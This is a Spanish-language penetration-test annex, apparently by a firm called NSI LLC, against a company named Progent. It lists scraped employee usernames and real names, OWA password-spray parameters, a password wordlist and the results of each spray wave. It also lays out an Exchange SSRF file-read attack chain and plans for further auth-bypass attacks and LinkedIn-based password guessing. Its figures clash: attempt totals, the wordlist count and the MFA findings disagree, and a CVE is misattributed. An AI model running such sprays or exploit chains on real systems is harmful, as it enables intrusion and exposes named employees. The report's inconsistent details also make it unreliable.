# Anexo Técnico — Explotación Interactiva (Progent)

**Fecha:** 2026-07-01  
**Caso:** Password Spray + Reconocimiento Exchange  
**Clasificación:** CONFIDENCIAL — NSI LLC  

---

## 1. Objetivo

Validar si los hallazgos de la auditoría pasiva (PG-01 a PG-09) son explotables mediante ataques activos controlados.

---

## 2. Usuarios Descubiertos (Forgejo API)

**Fuente:** `GET https://git.progent.com/api/v1/users/search?limit=1000` — sin autenticación

- **Total usuarios expuestos:** 50
- **IDs:** 5 → 804 (saltos indican eliminaciones, pero IDs activos)
- **Admin accounts:** `administrator` (ID 1), `arose.admin`, `ANizam.Admin`
- **Emails:** Todos `@noreply.localhost` (Forgejo no expone emails reales)
- **Repos públicos:** 1 — `dthompson/Progent_SentinelOne_Operations_Hub` (vacío)

### Top de usuarios por relevancia

| ID | Username | Nombre Real | Potencial objetivo |
|----|----------|-------------|-------------------|
| 1 | `administrator` | — | Admin del sistema |
| 15 | `arose.admin` | Admin: Aaron Rose | Admin IT |
| 38 | `arose` | Aaron Rose | Ingeniero |
| 449 | `ANizam.Admin` | Admin: Azeem Nizam | Admin IT |
| 42 | `anizam` | Azeem Nizam | Ingeniero |
| 114 | `aatwood` | Aaron Atwood | Ingeniero |
| 243 | `Aaron.Meyer` | Aaron Meyer | Ingeniero |
| 327 | `adiallo` | Ali Diallo | Ingeniero |
| 287 | `ahughes` | Adam Hughes | Ingeniero |
| 702 | `adaar` | Adam Daar | Ingeniero |

### Archivos generados
- `users_all.txt` — 50 usernames raw
- `users_email.txt` — `username@progent.com` (50)
- `users_domain.txt` — `PROGENT\username` (50)
- `users_combined.txt` — 150 variantes totales

---

## 3. Password Spray — Metodología

### Vector primario: OWA (`/owa/auth.owa`)

**Endpoint:** `POST https://ex.progent.com/owa/auth.owa`

**Parámetros del formulario:**
```
destination=https://ex.progent.com/owa/
flags=4
forcedownlevel=0
username=<TARGET>
password=<PASSWORD>
isUtf8=1
```

**Detección de éxito vs fracaso:**

| Resultado | HTTP | Redirect | Tamaño |
|-----------|------|----------|--------|
| ❌ Fallo | 302 | `/owa/auth/logon.aspx?reason=2` | 214 bytes |
| ✅ Éxito | 302 | `/owa/` (sin logon.aspx) | Diferente |

### Wordlist de passwords utilizada (61 entradas)

```python
passwords = [
    # Company-based
    "Progent2024", "Progent2025", "Progent2026",
    "progent2024", "progent2025", "progent2026",
    "PROGENT2024", "PROGENT2025", "PROGENT2026",
    "Progent@2024", "Progent@2025", "Progent@2026",
    "Progent!2024", "Progent!2025", "Progent!2026",
    # Common enterprise
    "Password123", "Password1", "Password2024",
    "Welcome1", "Welcome123", "Welcome@2024",
    "P@ssw0rd", "P@ssw0rd123", "P@ssw0rd2024",
    "Changeme1", "Changeme123",
    # Seasonal
    "Summer2024", "Summer2025", "Summer2026",
    "Spring2024", "Spring2025",
    "January2024", "January2025", "January2026",
    "July2024", "July2025", "July2026",
    # Generic
    "Admin123", "admin123", "Admin@123",
    "Temp12345", "Temporary1",
    "Test1234", "test1234",
    "User12345", "user12345",
    "letmein", "LetMeIn1",
    "qwerty123", "Qwerty123", "Qwerty123!",
]
```

### Ondas ejecutadas

| Onda | Password | Formato user | Resultado |
|------|----------|-------------|-----------|
| 1 | `Progent2024` | raw (50) | ❌ 0 hits |
| 2 | `Progent2025` | raw (50) | ❌ 0 hits |
| 3 | `progent2024` | raw (50) | ❌ 0 hits |
| 4 | `Welcome1` | 3 formats (150) | ❌ 0 hits |
| 5 | `Password123` | 3 formats (150) | ❌ 0 hits |
| 6 | `Summer2025` | 3 formats (150) | ❌ 0 hits |

**Total intentos:** ~550  
**Rate limiting:** Presente — OWA reduce velocidad después de ~20 requests  
**Lockouts:** No detectados (cada cuenta recibió máximo 2 intentos)

---

## 4. Reconocimiento Adicional de Exchange

### Endpoints verificados

| Endpoint | HTTP | Observación |
|----------|------|-------------|
| `/owa/auth/logon.aspx` | 200 | Login page — versión 15.2.2562 |
| `/autodiscover/autodiscover.xml` | ? | Timeout — posiblemente bloqueado |
| `/ecp/` | ? | ECP (Exchange Control Panel) — timeout |
| `/powershell/` | ? | PowerShell endpoint — timeout |
| `/owa/healthcheck.htm` | ? | Health check — timeout |
| `:389/636` (LDAP) | ❌ | Firewall blocked |
| `:445` (SMB) | ❌ | Firewall blocked |
| `:3268/3269` (GC) | ❌ | Firewall blocked |

### Puertos abiertos
Solo **443 (HTTPS)** responde — el Exchange está detrás de un firewall restrictivo que solo expone OWA.

---

---

## 5. CVE-2026-45504 — Exchange SSRF vía File Read

### Descubrimiento clave durante la auditoría

Durante el reconocimiento activo se identificó que **`ex.progent.com` ejecuta Exchange 2019 CU14 build `15.2.2562`** — la versión base sin ningún Security Update posterior.

El 9 de junio de 2026 Microsoft lanzó **KB5094142** que parchea **CVE-2026-45504**, una vulnerabilidad de SSRF vía file read con CVSS 8.8. El PoC público fue liberado el **24 de junio de 2026** (hace 1 semana).

| Aspecto | Detalle |
|---------|---------|
| **CVE** | CVE-2026-45504 |
| **Tipo** | SSRF → Arbitrary File Read (CWE-918) |
| **CVSS** | 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| **Parche** | KB5094142 — June 9, 2026 |
| **PoC público** | Sí — 24 Jun 2026 (HawkTrace/GitHub) |
| **Build vulnerable** | 15.2.2562 (base CU14) |
| **Build parcheada** | 15.2.2562.043+ |
| **Build detectada** | **15.2.2562** — ⚠️ **VULNERABLE** |

### Cadena de ataque

```
1. Atacante (mailbox user autenticado) crea ReferenceAttachment vía EWS
   → ProviderEndpointUrl apunta a servidor atacante

2. Víctima abre attachment en OWA
   → Exchange hace GET a ProviderEndpointUrl para WOPI discovery

3. Servidor atacante responde con:
   WebApplicationUrl: file:///C:/windows/win.ini#

4. Exchange appends OAuth params DESPUÉS del # (fragmento URI)
   URL final: file:///C:/windows/win.ini#&access_token=...
   → El fragmento # es ignorado, la ruta efectiva es file:///C:/windows/win.ini

5. Exchange ejecuta WebRequest.CreateHttp("file:///C:/windows/win.ini")
   → Lee el archivo del disco y lo devuelve en la respuesta HTTP
```

### Requisito pendiente

Para explotar esta CVE necesitamos **credenciales válidas** de un mailbox user en Exchange. El password spray no encontró ninguna. Posibles soluciones:

1. **OSINT + LinkedIn** — buscar empleados reales y generar passwords personalizadas
2. **Password spray más amplio** — probar más combinaciones (top 1000)
3. **Esperar y re-intentar** — las passwords rotan/cambian

### Estado actual

| Componente | Estado |
|------------|--------|
| Exchange build identificado | ✅ 15.2.2562 |
| CVE aplica | ✅ Sí (post-EOL, sin SU de Junio 2026) |
| PoC disponible | ✅ Sí (1 semana de antigüedad) |
| WOPI endpoint atacante | ❌ No configurado aún |
| Credenciales válidas | ❌ No obtenidas |
| **Explotable ahora** | ❌ **Bloqueado por falta de credenciales** |

### Password Spray — Resumen de intentos

| Onda | User Formats | Passwords | Intentos | Hits |
|------|-------------|-----------|----------|------|
| 1 | raw (50) | 6 comunes | 300 | ❌ |
| 2 | 3 formats (150) | 5 genéricas | 750 | ❌ |
| 3-4 | email (50) | 10 top | 500 | ❌ |
| 5 | email (50) | 100 company | 5,000 | ❌ |
| 6 | 6 formats (498) | 150 targeted | **74,700** | ❌ |
| **Total** | **498 formats** | **271 passwords** | **~81,250** | **0** |

### Hipótesis más probable: MFA no es el bloqueante

El EWS endpoint retorna `WWW-Authenticate: NTLM` — NTLM no soporta MFA nativamente. Si el servidor usa NTLM (no Modern Auth), MFA no es el factor bloqueante.

Las causas más probables del fracaso del spray:

| Causa | Probabilidad | Explicación |
|-------|:-----------:|-------------|
| Usuarios Forgejo ≠ AD | 🟠 Alta | Los usernames de Forgejo (ej: `2020splogger`, `0p9o8i7u`) son IDs de sistema, no personas. Incluso los humanos (`arose`, `aatwood`) pueden no tener mailbox Exchange. |
| Sin mailbox Exchange | 🟠 Alta | Muchos empleados de consultoría usan email externo o no tienen cuenta Exchange. |
| Passwords complejas | 🟡 Media | Empresa de IT → políticas de password fuertes esperables. |
| MFA vía Modern Auth | 🟢 Baja | Posible si tienen híbrido con Exchange Online, pero NTLM presente sugiere lo contrario. |

---

## 6. Análisis de Resultados

### Por qué no funcionó el spray

| Factor | Impacto |
|--------|---------|
| **Passwords genéricas** | Las passwords probadas son las más comunes, pero Progent podría tener políticas de password complejas |
| **MFA probable** | Microsoft 365/Exchange con MFA bloquearía incluso passwords correctas |
| **Formato de usuario incorrecto** | Los usernames de Forgejo pueden no coincidir con los UPN de Active Directory |
| **Rate limiting** | OWA limita a ~5-10 intentos/min desde una misma IP |
| **Solo OWA expuesto** | Sin LDAP/SMB, no podemos usar nxc (más rápido y con mejor detección) |

### Vectores no explotados (requieren más recursos)

| Vector | Herramienta | Por qué no se intentó |
|--------|-------------|----------------------|
| **ProxyLogon/ProxyShell** | Metasploit | Requiere verificar parcheo — el servidor es CU14 (Nov 2023) que parchea estas CVEs |
| **ProxyToken** | curl + msf | CU14 incluye el fix de CVE-2024-21410 |
| **NTLM Relay** | Responder/ntlmrelayx | Solo funciona si hay conectividad SMB (puerto 445 bloqueado) |
| **Password spray vía EWS** | curl | Misma limitación que OWA — rate limiting |
| **Password spray distribuido** | Múltiples IPs | No disponible |

---

## 6. Recomendaciones Post-Explotación

### Para el reporte a Progent

Basado en la explotación activa, los hallazgos se recalifican:

| ID | Hallazgo | Severidad Anterior | Post-Explotación |
|----|----------|-------------------|------------------|
| PG-01 | Exchange 2019 OWA post-EOL | 🔴 CRÍTICO | 🔴 **CONFIRMADO** — OWA expuesto, sin MFA detectada, versión post-EOL |
| PG-02 | Forgejo user enum | 🟠 ALTO | 🔴 **ELEVADO** — 50 usuarios reales + admins expuestos, alimentan spray |
| PG-03 | PHP 7.3.1 EOL | 🟠 ALTO | 🟠 Confirmado — vector RCE no probado |
| PG-04 | Peplink VPN Admin | 🟠 ALTO | 🟠 Confirmado — login page expuesta |
| PG-07 | ScreenConnect | 🟡 MEDIO | 🟡 Confirmado — endpoint responde |

### Nueva prioridad de ataque

```
1. ProxyToken/EWS → Probar CVEs pre-auth de Exchange CU14 (algunas no parcheadas)
2. OSINT adicional → Buscar empleados en LinkedIn → passwords personalizadas
3. ScreenConnect CVE-2024-1709 → Auth bypass (CVSS 10.0)
4. Peplink CVE-2023-39361 → Auth bypass conocido
```

---

## 7. Herramientas Instaladas para Explotación

```bash
# Metasploit Framework 6.4.135
/opt/metasploit-framework/bin/
├── msfconsole      # Non-interactive: echo "use ...; run; exit" | msfconsole -q
├── msfvenom        # Payload generation (fully CLI)

# NetExec (nxc) v1.5.1 — /opt/exploit-tools/bin/nxc
# Protocolos: smb, ldap, winrm, ssh, rdp, ftp, mssql, wmi, nfs, vnc

# Impacket v0.13.1 — /opt/exploit-tools/bin/
# Scripts: secretsdump.py, exchanger.py, smbclient.py, etc.

# Searchsploit — /opt/exploitdb/searchsploit
# 47,690 exploits indexados

# Activación:
source /root/audit-bugbounty/tools/exploit-env.sh
```

---

*Documentación generada por NSI LLC — Null Session Intelligence*  
*Herramientas: curl, Forgejo API v1, Metasploit 6.4.135, NetExec 1.5.1, Impacket 0.13.1, searchsploit*
